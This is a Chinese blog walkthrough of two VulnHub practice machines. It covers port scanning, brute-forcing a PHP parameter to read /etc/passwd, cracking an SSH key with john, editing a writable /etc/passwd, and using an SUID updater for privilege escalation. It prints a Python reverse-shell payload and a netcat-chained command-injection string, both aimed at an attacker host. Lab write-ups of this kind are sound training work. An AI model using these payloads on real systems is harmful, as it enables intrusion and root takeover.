---
title: Vuln EvilBox:One & BoredHackerBlog_Cloud_AV
published: 2024-12-12
pinned: false
description: Vuln EvilBox:One & BoredHackerBlog_Cloud_AV wp
tags: ['vuln']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2024-12-12
pubDate: 2024-12-12
---


## EvilBox: One
### 靶场链接
https://www.vulnhub.com/entry/evilbox-one,736/

#### 日常扫描
![image.png](https://www.helloimg.com/i/2025/01/09/677f6bd101d98.png)
发现这玩意靶机（这个需要自己配置一下网卡）
nmap扫描端口
![image-1.png](https://www.helloimg.com/i/2025/01/09/677f6c1aa458a.png)
没有用，dis或者是dirb扫一下
![image-2.png](https://www.helloimg.com/i/2025/01/09/677f6c1be4db5.png)
发现这几个，一个一个点进去看一眼，http://192.168.64.4/secret/ 网页是纯白的，
![image-4.png](https://www.helloimg.com/i/2025/01/09/677f6c1b24285.png)
#### 爆破
扫一下尾缀发现真有.php，bp抓包看一下
![image-5.png](https://www.helloimg.com/i/2025/01/09/677f6c1b66d3d.png)
用fuzz爆破一下，
![image-6.png](https://www.helloimg.com/i/2025/01/09/677f6c1c9baf1.png)
发现
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
可能是ssh的用户，页面上去看一样是密码，gpt格式化一下
![image-7.png](https://www.helloimg.com/i/2025/01/09/677f6c20aea62.png)
john去爆破私钥
>python /usr/share/john/ssh2john.py id_rsa > hash
john hash

得到密码是unicorn
#### ssh提权
![image-8.png](https://www.helloimg.com/i/2025/01/09/677f6c1d07bbb.png)
ssh上去
![image-9.png](https://www.helloimg.com/i/2025/01/09/677f6c1d55f91.png)
发现/etc/passwd可以修改，直接openssl passwd -1生成密码，然后把root后面的x改了，还有一个方法可以用https://blog.csdn.net/weixin_46700042/article/details/108813878
linpeas过两天考完试再学学怎么用（）
 
## BoredHackerBlog_Cloud_AV
### 靶场链接
https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/

#### 日常扫描
![BoredHackerBlog_Cloud_AV.png](https://www.helloimg.com/i/2025/01/09/677f70c3545a5.png)
发现靶机，nmap启动
![BoredHackerBlog_Cloud_AV1.png](https://www.helloimg.com/i/2025/01/09/677f70c2e5b89.png)
有个http服务页面，上去看一眼
#### sql注入/密码爆破
![BoredHackerBlog_Cloud_AV2.png](https://www.helloimg.com/i/2025/01/09/677f70c31c38b.png)
登陆框页面，sql注入/密码爆破都可以，当然了，身为密码手，直接弱密钥试试，password直接进去了（）
![BoredHackerBlog_Cloud_AV3.png](https://www.helloimg.com/i/2025/01/09/677f70c32479e.png)
#### 反弹shell
里面还有个框，试一下管道符拼接，没啥用，有python，直接反弹shell扔进去
>1|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

本地开nc监听一下
![BoredHackerBlog_Cloud_AV4.png](https://www.helloimg.com/i/2025/01/09/677f70c2ead2f.png)
有个.app和.sql，可能是账号密码什么的，直接拉取到本地
![BoredHackerBlog_Cloud_AV5.png](https://www.helloimg.com/i/2025/01/09/677f70c2b3a36.png)
![BoredHackerBlog_Cloud_AV6.png](https://www.helloimg.com/i/2025/01/09/677f70c524d88.png)
![BoredHackerBlog_Cloud_AV7.png](https://www.helloimg.com/i/2025/01/09/677f70c5da06d.png)
发现是密码，靶机有22端口，看看能不能ssh，尝试爆破后没有用
查了一下应该是suid提权（）
> find / -perm /4000 -type f 2>/dev/null

![BoredHackerBlog_Cloud_AV8.png](https://www.helloimg.com/i/2025/01/09/677f70c62d392.png)
发现scanner这个，刚才用过，可能还是在这里，进入文件夹，看一下权限
![BoredHackerBlog_Cloud_AV9.png](https://www.helloimg.com/i/2025/01/09/677f70c5eb945.png)
发现root了，甚至有个.c文件，看看
```
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;

}
```
我们需要注意的是ClamAV是一个linux的病毒扫描软件。freshclam相当于是一个更新clamav的病毒库的功能。同时对输入的参数进行的长度的限制，同时要求必须有参数的传入。这玩意参数会扔到system执行，那么反弹shell试试

>./update_cloudav "aasff | nc 192.168.64.3 5000 | /bin/bash | nc 192.168.64.3 6000"

连上去之后发现是root
![BoredHackerBlog_Cloud_AV10.png](https://www.helloimg.com/i/2025/01/09/677f70c6008ca.png)
![BoredHackerBlog_Cloud_AV11.png](https://www.helloimg.com/i/2025/01/09/677f70c6479df.png)
